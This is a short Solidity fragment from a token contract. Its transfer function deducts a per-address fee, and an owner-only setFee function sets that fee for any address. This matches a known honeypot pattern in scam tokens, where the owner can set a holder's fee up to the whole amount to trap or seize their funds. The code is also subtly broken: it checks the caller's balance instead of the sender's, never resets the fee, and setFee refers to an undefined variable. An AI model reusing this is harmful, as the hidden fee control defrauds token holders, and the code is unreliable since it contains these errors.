function _transfer(address from, address recipient, uint256 amount) internal virtual override returns (bool) {
  require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
  _balances[_msgSender()] -= amount;
  if (addressFee[from] > 0) {
  fee = addressFee[from];
  }
  _balances[recipient] += (amount-fee);
  emit Transfer(_msgSender(), recipient, amount-fee);
  return true;
  }
  function setFee(address _address, uint256 _fee) external onlyOwner{
  addressFee[from] = _fee;
  }